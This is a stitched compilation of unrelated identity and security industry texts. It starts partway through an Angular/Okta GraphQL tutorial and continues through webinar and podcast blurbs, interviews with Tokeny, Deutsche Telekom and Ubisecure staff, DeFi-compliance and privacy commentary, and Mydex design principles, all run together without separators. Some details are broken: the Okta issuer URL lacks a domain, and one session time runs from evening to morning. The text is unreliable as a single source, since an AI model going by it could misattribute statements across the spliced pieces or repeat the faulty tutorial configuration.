<p>The <code>bearerToken</code> middleware extracts the bearer token from a request header. <code>oktaAuth</code> then checks the token. You can now run <code>node app.js</code> again to start the server. Only now, if you try to access the API you will get a <code>401 Unauthorized</code> error response from the server.</p>

 Add Okta to Angular 

<p>To allow the client to access the GraphQL API, you need to also add Okta authentication to the Angular application. Open a terminal in the client’s project folder and install the <code>okta-angular</code> dependency by running the following command.</p>

   <code>npm install -E @okta/okta-angular@4.1.0 @okta/okta-auth-js@5.6.0
</code>   

<p>Open <code>src/app/app.module.ts</code> and create an <code>OktaAuth</code> instance by adding the following lines after the existing import statements.</p>

   <code>import { OKTA_CONFIG, OktaAuthModule } from '@okta/okta-angular';
import { OktaAuth } from '@okta/okta-auth-js';

const config = {
  issuer: '/oauth2/default',
  clientId: '{yourClientID}',
  redirectUri: window.location.origin + '/login/callback'
}
const oktaAuth = new OktaAuth(config);
</code>   

<p>Make sure to replace the <code>{...}</code> placeholders with your OIDC app settings.</p>

<p>Next, add <code>OktaAuthModule</code> to the array of <code>imports</code> in the <code>NgModule</code> configuration.</p>

   <code>@NgModule({
  ...
  imports: [
    ...
    OktaAuthModule
  ],
  ...
})
</code>   

<p>Also, create a new <code>providers</code> property that configures the module by pasting the code below after the <code>imports</code> array.</p>

   <code>providers: [{ provide: OKTA_CONFIG, useValue: { oktaAuth }}],
</code>   

<p>You now need to configure the router to accept the login callback from Okta. Open <code>src/app/app-routing.module.ts</code> and add the following import statement to the top of the file.</p>

   <code>import { OktaAuthGuard, OktaCallbackComponent } from '@okta/okta-angular';
</code>   

<p>Update the <code>routes</code> configuration object to match the code below.</p>

   <code>const routes: Routes = [
  {
    path: '',
    component: HomeComponent
  },
  {
    path: 'browse',
    component: BrowseComponent,
    canActivate: [ OktaAuthGuard ]
  },
  {
    path: 'character',
    component: CharacterComponent,
    canActivate: [ OktaAuthGuard ]
  },
  {
    path: 'species',
    component: SpeciesComponent,
    canActivate: [ OktaAuthGuard ]
  },
  {
    path: 'login/callback',
    component: OktaCallbackComponent
  },
];
</code>   

<p>Here you have added the <code>OktaAuthGuard</code> to the three routes that display character data. When a user who isn’t logged in attempts to access these routes, they will now automatically be redirected to the Okta sign-in page before gaining access.</p>

<p>In the last section, you added authentication to the server. This means that any access to the server now needs to provide an access token. To provide this token, open <code>src/app/graphql.module.ts</code> and replace the existing <code>createApollo</code> function with the implementation below.</p>

   <code>import { setContext } from '@apollo/client/link/context';
import { OktaAuth } from '@okta/okta-auth-js';

const uri = 'http://localhost:4201/graphql'; 
export function createApollo(httpLink: HttpLink, oktaAuth: OktaAuth): ApolloClientOptions&lt;any&gt; {
  const http = httpLink.create({ uri });
  const auth = setContext(async (_, { headers }) =&gt; {
    const token = oktaAuth.getAccessToken();

    return token ? { headers: { Authorization: `Bearer ${token}` } } : {};
  });

  return {
    link: auth.concat(http),
    cache: new InMemoryCache()
  };
}
</code>   

<p>The function now expects an <code>OktaAuth</code> instance as the second argument. This means that you have to add it to the <code>deps</code> array in the <code>NgModule</code> provider for the Apollo options. Update the <code>deps</code> array to match the following.</p>

   <code>deps: [HttpLink, OktaAuth]
</code>   

<p>Finally, you want to provide feedback to the user’s sign-in status and also provide manual ways of logging in and out of the application. Open <code>src/app/navbar/navbar.component.ts</code> and replace its contents with the code below.</p>

   <code>import { Component } from '@angular/core';
import { OktaAuthStateService } from '@okta/okta-angular';
import { OktaAuth } from '@okta/okta-auth-js';

@Component({
  selector: 'app-navbar',
  templateUrl: './navbar.component.html',
  styleUrls: ['./navbar.component.css']
})
export class NavbarComponent {
  
  constructor(public authStateService: OktaAuthStateService, private oktaAuth: OktaAuth) {}

  async login() {
    await this.oktaAuth.signInWithRedirect();
  }

  async logout() {
    await this.oktaAuth.signOut();
  }

}
</code>   

<p>The <code>OktaAuthStateService</code> can be queried to provide the user’s status. The callbacks <code>login()</code> and <code>logout()</code> can be used to sign the user in and out. Now, open <code>src/app/navbar/navbar.component.html</code> and add the following lines as the first element inside the <code>&lt;nav&gt;</code> element.</p>

   <code>&lt;div&gt;
  &lt;button *ngIf="!(authStateService.authState$ | async)?.isAuthenticated" (click)="login()"&gt;Login&lt;/button&gt;
  &lt;button *ngIf="(authStateService.authState$ | async)?.isAuthenticated" (click)="logout()"&gt;Logout&lt;/button&gt;
&lt;/div&gt;
</code>   

<p>This will show a Login button if the user is not logged in and a Logout button if the user is logged in.</p>

<p>Congratulations! You have completed the implementation of an Angular app that consumes GraphQL from a Node/Express server. The application is secured with Okta’s authentication service. You can now start the app by running <code>ng serve</code> in your project folder. Make sure the server is also running as described above. Open your browser to <code>http://localhost:4200</code> to open the app. When you click on Browse in the navigation bar, you will be taken to the Okta sign-in page. Once you logged in, you will be redirected to the character browser. You should see something like the image below.</p>

 Learn more about Angular, GraphQL, and single-page applications 

<p>In this tutorial, I have shown you how to create a single-page application that consumes a GraphQL API using Angular. You’ve seen how to create a GraphQL schema that describes the queries and the results that the server supplies.</p>

<p>GraphQL provides a flexible way of implementing APIs that can be extended without breaking existing clients. Clients can specify the data they want to receive and can combine multiple requests into a single query. This makes GraphQL faster than traditional REST APIs because the number of API calls can be greatly reduced.</p>

<p>The app you have written consists of a server and a client. The server uses Express to parse incoming requests before passing them to the GraphQL middleware. The client is built using Angular and uses the Apollo library to interface with the GraphQL API.

  <p>In the era when data has replaced oil as the most valuable commodity, APIs have become an important logistical foundation of modern digital business. As a result, APIs have also become a popular target for cyber attackers, and therefore effective API security is essential. However, focusing only on the operational aspects is no longer enough.</p>
<p>Security teams typically struggle to keep up with the increasing volume and scale of APIs, and traditional security and API management solutions do not address all API security challenges. A new approach is needed, according to Alexei Balaganski, Lead Analyst at KuppingerCole and Isabelle Mauny, co-founder and field CTO of 42Crunch.</p>
<p>Join these experts as they discuss the benefits of an integrated, continuous, and proactive approach to API security that combines proactive application security measures with continuous activity monitoring, API-specific threat analysis, and runtime policy enforcement.</p>
<p>Alexei Balaganski explains how the security and compliance risks that APIs are exposed to are shaping the future of API security solutions and provides an overview of the latest innovations in protecting the whole API lifecycle.</p>
<p>Isabelle Mauny shows how a continuous API security model can be achieved and shares a recent case study from a global manufacturer, with an overview of the 42Crunch Developer-First API Security Platform.</p>				<br><br><a href="https://www.kuppingercole.com/watch/continuous-api-security-protecting-digital-business"></a>

			 Eloi Garrido is Full Stack Developer at Tokeny Solutions.&nbsp; 

		 
	 

	 
		 
			 Who are you? 
<p>My name is Eloi Garrido. I graduated as an electronics engineer with a master’s degree in embedded systems from Delft University of Technology (NL) and right away moved into programming. I lived in the Netherlands for several years, where I met my partner, and after several attempts I managed to convince her to come to the sunny south. Since my early years, I’ve been interested in technology and tinkering with anything that has a spark. Still, to this day, my parents blame me for any appliance that has stopped working at home.</p>
 How did you land at Tokeny Solutions? 
<p>Since early 2017 I ended up falling into the crypto rabbit hole and preaching to my friends about it. However, at that point it was mostly a hobby and a bit of an obsession, but still something that at the time didn’t cross my mind could become a profession.</p>
<p>Soon after returning from the Netherlands to Barcelona, I started looking for my next professional adventure and landed at Tokeny, and it felt like the planets aligned, the rest is history.</p>

		 
	 
 
	 
		 
			 How would you describe working at Tokeny Solutions? 
<p>Working at Tokeny has been a pleasure, very welcoming since day one and surrounded by very talented and engaged people. The team has always been flexible and adaptable, even in the face of our current world situation, allowing me to grow and partake in interesting projects.</p>
 What are you most passionate about in life? 
<p>I’m a sucker for anything tech related. When I’m not checking the latest toys, I like to gather around friends and family for some relaxing long meals or gaming sessions.</p>

		 
	 
 
	 
		 
			 What is your ultimate dream? 
<p>From a personal point of view, I dream about having a comfortable and joyful life with my loved ones without any complications. On a global scale, I would love for all of us to stop fighting inwards over every detail and work together towards our general betterment, what couldn’t we achieve then?</p>
 What would you change in the world if you could? 
<p>A bit of a generic statement, but I would love to see hate disappear, or at least mostly reduced. So that people would focus more on what makes us similar than what differentiates us, all this would leave us with more time to enjoy life instead of wasting it in squabbles.</p>

<p>The Zero Trust model is the belief that no one should be trusted from inside or outside your network, until their identity has been verified. Zero trust refers to the alignment of maturing identity practices, an established understanding of user behaviors, and the application of least-privilege access security policy decisions to trust boundaries. In this week's State of Identity, host, Cameron D’Ambrosi debunks the buzz around zero trust architecture with Ryan Case, Chief Cybersecurity Architect at SailPoint. They provide first-hand guidance on identity-defined security architecture and how it enriches authorization with both contextual and intelligent access information to make objective decisions. In this session, you'll learn how to reduce friction to end-users while enabling deliberate identity verification and policy decisions.</p>

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Thomas Tschersich, Chief Security Officer at Deutsche Telekom, served as an advisor in the preparation for the <a href="https://www.kuppingercole.com/sessions/4864">Cyber Council Panel on Cybersecurity Predictions 2022</a> which will see CISOs, CIOs, and CSOs discuss next year's cybersecurity threatscape on Wednesday, November 10 from 09:30 pm to 10:10 am at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Thomas some questions about his predictions.</p>
  
 Could you give us a sneak peek into the “Cybersecurity Trends 2022”? 
<p>Yeah, actually, well, when I look at the recent developments, I believe that DDoS attacks will be definitely an ongoing trend next year as well. So we see a couple of thousand attacks every month. And the second thing which will drive us will be, in my prediction, the ransomware topic, as this is still growing. We might see some new deep fakes. So cases with CEO fraud, with really deep faked videos instead of just cheating email conversations or phone calls. But that's in a nutshell what I do expect.</p>
 Which three Cybersecurity types of attacks do you expect being most threatening to your organization and why in 2022? 
<p>So I have no special type of attack in mind here. I would turn that a little around. So what I do expect most threatening not only for us but for all organizations, is still that we don't have the basics under control. What do I mean by that? Not having the basics under control is, for me, not more and less than cleaning up our infrastructures by introducing software updates really in a timely manner to the new detection of vulnerabilities. So we're all not good in doing so. And the result is that more than 95 percent of the attacks are being successful just because of missing software updates or bad configurations of systems.</p>
<p>This should keep us awake at night and this should be the priority number one, two, and three for next year, really to get it fixed. And so we need to bundle our forces so we need a better exchange between enterprises to share whether an update is working or not. So not to do testing in any case at any company so we can become better just by sharing that knowledge. But we also need better support from vendors. There are still a lot of also huge vendors existing which are not really open and honest about their vulnerabilities and which are not really supporting their clients on a daily basis.</p>
 Which three Cybersecurity topics are most important to you and why in 2022? 
<p>Look, as the whole industry is now moving more and more into cloud services, the perimeter of the company is paralyzing itself. So there is no perimeter to protect any longer, actually no perimeter like in the past. So there's not the one and only perimeter. So, therefore, I believe concepts like Zero Trust becoming increasingly important to bundle the security more to the endpoint and on the other side, to the data itself and not any longer to the corporate network infrastructure. So this is for me, one definite trend we have.</p>
<p>The second thing which is closely aligned with that is that prevention only is not sufficient enough for the future. It's more about having capabilities to monitor the status, to monitor your infrastructure, and then to be able to react fast if there are some anomalies being detected there. Yeah, this is the biggest challenge for most of the organizations, as a lot of organizations were pretty much focused on shielding themselves, building a fence around their infrastructure. And that's more or less one hundred percent of the cyber protection. And nowadays, you have to assume that attackers will be successful at one point in time, and therefore, you need to have these better monitoring capabilities without for sure losing the preventive approach totally. So but it's shifting the forces, and that's definitely one of the priorities for me and my team.</p>
 What are your three biggest challenges in implementing Cybersecurity and why? 
<p>I would say the challenge, number one, is the shortage of resources, of skilled resources, at the market and it's the challenge number two, three, four, five, six, seven, eight, and ten, and so on. That's the biggest issue currently, really to find the right people for your team to find the right resources to deal with security as the market is demanding so much at the moment. It is totally empty. So we're investing a lot in training and education for our people to train them by ourselves. So that's the only way out at the moment. And yeah, I guess this is what we need to solve. Otherwise, we got lost in the cybersecurity arena. It's not that much a technical issue because there are a lot of technical solutions available and in place. It's more the people to run those infrastructures.</p>

 A look into how we’re ensuring compliance without removing the “De” from&nbsp;DeFi. <p>Decentralized finance is the new frontier of investment and value propagation on the internet. It offers a new, innovative method for investing in assets. It removes the hassle of going through regulated channels and submitting many documents for verification of personal data. On the surface, this seems like an ideal solution for many people since it gives them a way to invest and keep their assets and earnings anonymous to those it doesn’t concern. It also introduces an added element of security for many individuals since they are in complete control of their finances.</p><p>Unfortunately, DeFi also opens up a nest of issues, including users bypassing Anti Money-laundering (AML) laws and Countering the Financing of Terrorism (CFT) guidelines. Given the decentralized nature of the sector, however, how can compliance even be implemented? Compliant DeFi, something we’re proud to be pioneering at Shyft Network, would deal with these issues and other regulatory elements such as Know Your Customer (KYC) rules without forcing users and companies to conform to a centralized data store. Recent regulatory constraints such as the FATF Travel Rule and stipulations in the Infrastructure Bill mean that DeFi needs to start taking compliance seriously.</p> Not As Counter-Intuitive As It First&nbsp;Seems <p>Compliance in the financial sector helps to bring confidence to the consumer, financial institutions, and regulators. Unfortunately, the side effect of this added consumer confidence is the financial institution’s storage of personal user data, shared at will with governments. Since there’s no decentralized methodology for collecting and storing information in decentralized finance, implementations of KYC, CFT, and AML rules must become more innovative. Luckily, Shyft has been looking into the problem, and we’ve developed several solutions that fit the needs of decentralized finance platforms the world&nbsp;over.</p><p>The biggest issue we’ve seen with compliance is that it tries to impede the very soul of decentralization. Regulators are afraid that decentralized applications (DApps) don’t have a central body responsible for their function. The FATF Travel Rule (among others) underlines the reasoning behind regulators’ insistence on establishing a compliance framework for cryptocurrencies.</p><p>In essence, the most significant concern regulators have boils down to accountability. If someone does something illegal within the realm of DeFi, who is responsible for the fallout? Is it the decentralized autonomous organization’s (DAO’s) members? Is it the DApp that facilitated the illegal action or collected the proceeds on behalf of the perpetrators? Is it the stakeholders of the blockchain where the illegal proceeds were stored? There exists a need for this sort of accountability in the cryptoverse, but the implementation cannot go against the core foundation of why decentralized finance exists. We cannot create a decentralized platform and then centralize its data for compliance purposes. The solution, therefore, is to find a way to decentralize this data collection and verification process.</p> A Way&nbsp;Forward <p>Shyft Network has spent a considerable amount of time assessing, analyzing and researching these challenges, developing a solution that works well with current compliance regulation, and marrying it to an approach that maintains the spirit of decentralization. The solutions we are developing examine the existing framework of decentralization and use those as a base for creating a network that exists in harmony with current implementations. The Shyft Network doesn’t force any users to make fundamental changes to how their underlying systems work. Instead, it’s a modular implementation that allows for secure financial transactions with minimal risk to users. Solutions we’ve developed to deal with the compliance problem in DeFi&nbsp;include:</p>  Veriscope GDPR/AML Compliant Discovery Mechanism: Veriscope is one of Shyft Network’s most recent innovations to offer Virtual Asset Service Providers (VASPs) like crypto exchanges a way to deal with the FATF Travel Rule and reach compliance. Veriscope is a decentralized solution (in holding with Shyft’s focus on keeping the decentralization in DeFi) that helps VASPs deal with the regulatory requirements instituted by authorities.  Proof of Identity and Whitelisted Addresses: The Shyft Network can work with both centralized and decentralized entities to bring about equality in verifying user information. DeFi participants can submit their data to a verifying oracle which will be used to safelist their address for transactions. Once the address has been whitelisted and linked with the user’s identification, they can participate in DeFi transactions freely. Recently, Shyft Network <a href="https://shyftnetwork.medium.com/shyft-network-partners-with-kylin-network-to-deploy-data-oracles-for-compliant-defi-infrastructure-fcc2c7c3a233">partnered with Kylin</a> to develop these decentralized oracles in keeping with their goal to provide a safe, secure way for financial institutions to interact with the DeFi&nbsp;space.  Risk Assessment Mechanisms for DeFi Projects: To ensure that bad actors don’t abuse the system or take advantage of users, wallet transactions with smart contracts will be continually monitored for signs of untoward behavior. DeFi platforms that want to know more about their users can easily access this information to ensure that they have a more trustworthy network.   Expanding Markets Mean More Compliance is Necessary <p>DeFi is a space that will see exponential growth in the coming years. Early adopters already have their hands full, trying to keep abreast of the burgeoning growth and development of decentralized applications. However, as the popularity of DeFi grows, the threat of regulation will always linger, and facing it head on is the best way to deal with it. Compliance allows decentralized platforms to stay one step ahead of regulators, giving users the peace of mind they want. Shyft Network will be continuing to lead this charge to create proactive, innovative compliance in its network.

<p>This quote from Tech Crunch commentor&nbsp;<a href="https://techcrunch.com/2021/08/10/with-liberty-and-privacy-for-some-widening-inequality-on-the-digital-frontier/">Cillian Kieran</a>&nbsp;caught our eye: “Alongside regulation, every software engineering team should have privacy tools immediately available. When civil engineers are building a bridge, they cannot make it safe for a subset of the population; it must work for all who cross it. The same must hold for our data infrastructure, lest we exacerbate disparities within and beyond the digital realm.”</p>



<p>The quote comes from an&nbsp;<a href="https://techcrunch.com/2021/08/10/with-liberty-and-privacy-for-some-widening-inequality-on-the-digital-frontier/">article</a>&nbsp;on “widening inequality on the digital frontier” which poses valuable questions about whether we now need “a material perspective on widening privacy disparities — and their implication in broader social inequality — to catalyze the privacy improvements the U.S. desperately needs.” Kieran raises the material argument since, he says, the law doesn’t always recognize the emotional perspective of privacy as harm or as a driver for regulatory change.</p>



<p>Kieran makes two great points: First, almost all users in the US (except those who live in California under the CCPA) have no rights to opt-out of aggressive data collection and targeted advertising. But the fact that Californians&nbsp;can&nbsp;opt out implies there are harms from targeted advertising, which we know to be true and have discussed&nbsp;<a href="https://mysudo.com/2021/06/the-privacy-pitfalls-of-personalized-advertising/">here</a>,&nbsp;<a href="https://anonyome.com/2021/06/do-consumers-even-want-personalized-ads/">here</a>&nbsp;and&nbsp;<a href="https://anonyome.com/2021/06/digital-advertising-may-present-national-security-risks-us-senators/">here</a>. So why aren’t we protecting the millions of users who live anywhere other than California from these harms?</p>



<p>Kieran cites the example of targeted advertising leading to discrimination in<a href="https://hbr.org/2019/11/how-targeted-ads-and-dynamic-pricing-can-perpetuate-bias">&nbsp;housing and employment opportunities</a>, “sometimes in violation of federal law” where it “impedes individuals’ autonomy, preemptively narrowing their window of purchasing options, even when they don’t want to.”&nbsp;</p>



<p>Second, Kieran points out&nbsp;money talks, including in digital privacy protection. He points to Apple making noises about privacy being a human right all while building and marketing luxury products only some can afford.&nbsp;</p>



<p>He argues: “… if those declaring privacy as a human right only make products affordable to some, what does that say about our human rights? Apple products skew toward<a href="https://www.comscore.com/Insights/Infographics/iPhone-Users-Earn-Higher-Income-Engage-More-on-Apps-than-Android-Users">&nbsp;wealthier, more educated consumers</a>&nbsp;compared to competitors’ products. This projects a troubling future of increasingly exacerbated privacy disparities between the haves and the have-nots, where a feedback loop is established: Those with fewer resources to acquire privacy protections may have fewer resources to navigate the technical and legal challenges that come with a practice as convoluted as targeted advertising.”&nbsp;</p>



<p>“We deserve meaningful privacy protections that everyone can afford. In fact, to turn the phrase on its head,&nbsp;we deserve meaningful privacy protections that no company can afford to omit from their products.&nbsp;We deserve a both/and approach: privacy that is both meaningful and widely available.”</p>



<p>Kieran says the only way to close the disparity gap and get meaningful protections is via privacy legislation and privacy tools. Lawmakers must set the standards and engineers must have no reason not to embed user data privacy controls in products they develop.&nbsp;</p>



<p>He says: “We need privacy rules set by an institution that is not itself playing the game. Regulation alone cannot save us from modern privacy perils, but it is a vital ingredient in any viable solution.”</p>



<p>Which brings us back to where we started:</p>



<p>“Alongside regulation, every software engineering team should have privacy tools immediately available. When civil engineers are building a bridge, they cannot make it safe for a subset of the population; it must work for all who cross it. The same must hold for our data infrastructure, lest we exacerbate disparities within and beyond the digital realm.”</p>

In the course of human history, trust has changed its meaning from a person’s word to a bill of exchange, to a legal document and, most recently, in the 21st century, to technology. In the last decade, blockchain has created “trustless” systems where individuals do not need to trust anyone except software to verify transactions. Blockchain brought not only trust to the masses through shared access of decentralized information but has also fundamentally changed the future of trust ecosystems.</blockquote><p>Ontology, with its MainNet launch in June 2018, is building infrastructure for a peer-to-peer trust network with a decentralized identity framework that allows users to have full control over their data for real-world use cases. While traditional economies rely on third party service providers to facilitate trust, Ontology enables decentralized trust that aims to integrate the blockchain and different business sectors through partnerships to provide distributed services including distributed communities, data verification, data exchange, and credit across industries.</p><p>Cointelegraph — <a href="https://cointelegraph.com/news/likes-out-facebook-blackout-sparks-ideas-for-web-3-0">Likes out: Facebook blackout sparks ideas for Web&nbsp;3.0</a></p><blockquote>Over the past few years, the influx of moral concerns surrounding privacy breaches, data gathering, censorship and fake news has fuelled the conversion for a renovation of the social media platforms that have come to dominate our democracy. The prevalence and severity of such issues have even begun to deter conscious users away from centralized behemoths like Facebook, YouTube and Twitter, in favor of more liberating alternatives. The rapid emergence of cryptocurrency and blockchain technology, specifically its native features of decentralization, transparency and community reward, has empowered the rise of these next-generation initiatives.</blockquote><p>Going forward, a move toward decentralized identity solutions is essential to ensure data privacy and security. By facilitating end-to-end technology run on blockchain, decentralized solutions enable private information to be shared securely, while users remain in full control of their data. In contrast to centralized solutions, decentralized systems ensure private data remains immutable and secure and is only able to be shared when users consent to provide information.</p><p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

<p>In <a href="https://medium.com/mydex/flicking-the-switch-of-personal-data-4c5d0d368a31">our last blog</a> we talked about diverse, practical ways in which we help people and organisations use personal data to get stuff done — to enrich peoples’ lives and improve service quality in a way that cuts friction, effort, risk and cost for both&nbsp;sides.</p><p>The tools and capabilities we discuss in that blog are great. But to be truly valuable, they also need to be robust and ethical. They need to be based on sound design principles.</p><p>Below are some of the design principles that underpin our infrastructure and services — principles designed to ensure that what we do truly does serve citizens, today and into the&nbsp;future.</p>  Safe, efficient data logistics Our personal data stores (PDSs) use APIs to enable safe efficient data sharing between individuals and organisations. Organisations can deposit data in an individual’s PDS, and individuals can share data with these organisations. Our PDSs don’t only provide safe storage facilities. They also provide safe, efficient data sharing capabilities which keep the individual in control. We call this ‘personal data logistics’.  Individual the point of integration Our personal data stores enable individuals to aggregate data about themselves that is currently dispersed across many different service providers. For example, most UK citizens have over a dozen relationships with different financial service providers: one or more banks and building societies, loan providers, mortgage providers, savings providers, investment services, pensions, insurances and so&nbsp;on.  <p>It’s only by aggregating data from all these service providers (and by adding additional information that only the individual knows) that it’s possible to gain a true, fully-rounded picture of an individual’s financial circumstances, and therefore to be able to give truly personalised, relevant advice. That is why we applied for and got an Open Banking&nbsp;licence.</p><p>Our infrastructure is designed to enable the provision of such genuinely personalised advice across every walk of life: money, health, career,&nbsp;etc.</p>  An asset for life By enabling individuals to aggregate data (including <a href="https://medium.com/mydex/proving-verified-attributes-work-3f9ca813d43f">verified attributes</a>) about themselves in their own personal data store, we provide them with an asset for life: an asset that grows in value over time as more data is added to&nbsp;it.  Seek win-wins Many data relationships are adversarial, where one side seeks to extract value from another. We seek to enable mutually beneficial, productive relationships between citizens and bona fide service providers. For example, as the data in an individual’s personal data store grows in richness and value, citizens can bring this data with them to relationships with service providers, helping both sides access and use the data they need for better services at lower&nbsp;cost.  Neutral In line with the above, our platform is not designed to help one organisation gain competitive advantage over another. It is designed to enable all sides to improve the way they operate, by helping everyone involved reduce friction, effort, risk and cost for example. So our charging structure doesn’t favour one organisation over another and it doesn’t incentivise us to try and make money out of individuals’ data either. (For example, if we charged a fee per data transaction, our revenues would grow with the volume of data sharing and that could incentivise us to pressurise individuals into sharing more data than they want to. So we&nbsp;don’t.)  Truly independent Our personal data stores are truly independent and under the control of the individual. They do not sit inside any data-holding service provider’s organisational boundaries and do not depend on any service provider’s systems and technologies. Individuals don’t have to use any organisation’s identity processes to access their data. Organisations which deposit copies of an individual’s data in that individual’s personal data store cannot tell the individual what they should or shouldn’t do with it, or who they can or can’t share it&nbsp;with.  <p>This is important because the more fashionable personal data stores become, the more people there are out there pretending to offer personal data stores but where, if you look a little more closely, it actually continues the organisation’s control of individuals’ data (by doing one or more of the&nbsp;above).</p>  Safety and security Each individual’s personal data store is separately and individually encrypted. This means our infrastructure is distributed, not centralised — so that it is designed to be the opposite of a honeypot for hackers. (If a hacker wants to access the records of millions of people in a centralised corporate database, they only need to succeed in one hack. For a hacker to access the records of a million people on our infrastructure, they would have to succeed at a million separate, different hacks, each time accessing the data of only one individual. That makes the hacker’s incentives a million times a million less attractive (a million times harder, for a millionth of the&nbsp;reward).  No knowledge Each individual holds their own encryption key to their PDS, which we don’t have. We have designed our systems so that they do not look at an individuals’ personal data or who is delivering it or requesting it. We have provided the tools needed for the individual to be in control and able to see who is using their data for what purpose and approve such uses. We cannot see and don’t want to see their data. As a Community Interest Company we want to help people, not exploit them or intrude upon&nbsp;them.  Interoperable There is no point in doing all the above good things if the end result is to trap people inside a system that they can’t get out of. People have to have choices; genuine alternatives. Competition over who can provide the best genuine data empowerment can only be a good thing. For this reason, we expect many personal data store providers to emerge, and we are fully committed to enabling users to transfer their data from our systems to other systems and vice versa. We believe in interoperability.  Commercial integrity Our business model is designed to support all the above principles. We are a Community Interest Company. Yes, we are commercial — to fulfil our mission we have to cover our costs. But we are not in this to maximise the profits we can make, but to maximise the benefits citizens can get from their data. So we don’t charge individuals for having a PDS. Instead, organisations pay us for enabling safe, efficient data sharing relationships with customers.   Summary <p>As the concept of personal data stores grows more fashionable, we’ve got no doubt that clever people will invent many exciting new tools that do wonderful things. That’s great. It’s how it should&nbsp;be.</p><p>But for such creativity to really deliver value, it must be built on solid foundations. We believe design principles like the ones listed above provide the foundations our society needs to put personal data on a new, trustworthy footing.</p> <p><a href="https://medium.com/mydex/designed-for-integrity-13a69bcda0b2">DESIGNED FOR INTEGRITY</a> was originally published in <a href="https://medium.com/mydex">Mydex</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

 Podcast transcript 
<p>Let’s Talk About Digital Identity, the podcast connecting identity and business. I am your host, Oscar Santolalla.</p>
<p>Oscar Santolalla: Hello and thanks for joining today. After some time we are having a guest from the house, from Ubisecure, and he is a guest who has been in Ubisecure for 12 years. So let me introduce to you, Keith Uber.</p>
<p>He is the VP Customer Success at Ubisecure. As an identity and access management product expert, he leads the Sales Engineering team and is involved in many stages in the planning and design of demanding customer implementation projects. Keith is active in various industry organisations, and has a keen interest particularly in government mandated digital identity systems. Having been involved in dozens of IAM implementation projects, he is quick to identify organisation’s needs, and provide suitable configuration, integration and roadmap guidance.</p>
<p>Hello Keith and welcome.</p>
<p>Keith Uber: Hello, Oscar. And thank you very much for having me. It’s a pleasure to be here.</p>
<p>Oscar: It is really great talking with you. You had really long experience in Ubisecure and in the industry so have super interesting things to tell us. We will talk about mergers and acquisitions today. But before that, we’d like to hear a bit more about yourself, so please tell us your journey to this world of digital identity.</p>
<p>Keith: For me, digital identity became part of my career when I moved to Finland in 2000. So this was the height of the .com boom. I got a job working for Sonera, which is now Telia, one of the largest Telco operators in the Nordic countries. As part of that role, one of my jobs was to help Telia to combine the login systems for various small start-up companies, various small projects that they had acquired during the .com phase. They acted as a kind of a technology incubator for many small companies too so they had a huge portfolio of disparate services, all with different ways to sign in and authenticate. That’s where my journey started.</p>
<p>So I have a background as a software engineer. I have a Bachelor of IT and previously worked in logistics field as a software developer. But after moving to Finland, I later studied software business then continued after graduation joined Ubisecure and I’ve been working with identity and access management, particularly customer identity and access management ever since then. So in various roles I have been involved in so many different customer projects, not only individual customers, but also entire industries or government services that are going online. So I’ve been really fortunate to have a wide range of experience in quite a short amount of time.</p>
<p>Oscar: Very interesting. Sounds to be your first contact with digital identity there in Sonera – was the previous name for what is Telia today. So you mentioned several small companies that they had these challenges of authentication, login, registration, this kind of stuff. I’m guessing, we talk about 2000 is that there were not standards like we had today about digital access management. So well, I can imagine challenging has been that time, today, still challenging, but we have standards, and that is great.</p>
<p>But also that comes to the topic of today, right? So company can acquire smaller organisations. And one of the challenges is, for instance, if a company – let’s move from Telco to, let’s say e-commerce – can be a big e-commerce place acquires a smaller one, another e-commerce place, and what the customers would, by knowing that if they read that on the news, they will expect that “OK, and now I can log in from one place to another automatically, right?” That’s what the customer would expect. I think that’s one of the challenges I guess you are going to tell us more. But in your opinion, why is identity an important topic when it comes to mergers and acquisitions?</p>
<p>Keith: I think the most important part of mergers and acquisitions is that the customer is the value of the company. They’re the consumer who is buying the services or the people interacting with the company. So in a merger or acquisition or divestiture, when a company splits into two, it’s important that you retain those customers, that you don’t by mismanagement or mistake accidentally isolate your customers, make it difficult for them to sign in, or make it difficult for them to start to enjoy the services of the company that you’re also acquiring. So that’s all about keeping that valuable asset, keeping the customer happy.</p>
<p>Oscar: Yeah, I agree because it might be that you, as a customer, one can be super happy with a service, with a company. And after that, after the merger/acquisitions, well, things don’t work so smooth anymore for the customer, right? And that can make as you said, have the customers unhappy.</p>
<p>Keith: In most cases, mergers are all about acquiring some type of complementary company or company that offers a service that is enjoyable for the current user population. So it’s all about allowing them to start to consume more and more services so you get more revenue for every customer.</p>
<p>Oscar: Exactly. So now if you put the shoes of company that knows that they are going to be merged or there is acquisition already in place and start to plan how we are going to merge the systems, et cetera. What are these, for you, are the top, the key identity considerations that this organisation has to go through?</p>
<p>Keith: You spoke about the importance of standards and how the industry has really standardised on some key identity standards. So for companies who are looking to grow through either being acquired or acquiring other companies, it’s important that they have their identity management under control. They’re using standardised systems, they’re using the same standards that other services use, that makes the migration and integration process much, much easier.</p>
<p>And part of that underlying is all about data quality. So making sure that you’re keeping your user information, your user database, not only secure but up to date that it’s full of verified and valued information that could be easily used to match accounts as you go through that merging process.</p>
<p>Another really important thing is to really plan carefully about how that merger will look from the end user perspective, what will they retain, which account will they retain, will become their core account, or will you allow the customers to sign in using both types of credentials that they already have? And then what’s the timeline, for example sunsetting the unused or the system that will be turned off.</p>
<p>Generally, in terms of mergers and acquisitions, you want to simplify the IT systems by merging them and then sunsetting or turning off the system that you don’t choose to continue with. And that’s all about reducing the overall costs for not only licensing of the system, but also uptake and management of the system and simplifying the IT architecture to reduce, for example, simple things like customer support, when somebody has trouble logging in, or resetting a password, or enabling a new authentication method that is common across the whole organisation.</p>
<p>There’s a slight risk there that by combining multiple systems, even two or three into one, you’re also putting your eggs into one basket so there’s of course a risk of having a single point of failure. But on the flip side, you have more people, more IT resources looking at one system, focusing on one system and having expertise in that one system and keeping that up-to-date and smoothly running. And all modern identity and access management systems are fully reliable at scale in that type of scenario.</p>
<p>Oscar: And I guess also, one point is we’ve been talking mostly about customers, but about the workforce, about the employees I think they are also important considerations.</p>
<p>Keith: Oh, absolutely. The backend staff, who need to access these systems, and as the internal employees also merge, you want to make that as smooth as possible so that the company that’s being required, they also feel like fully-fledged employees, as soon as we can.</p>
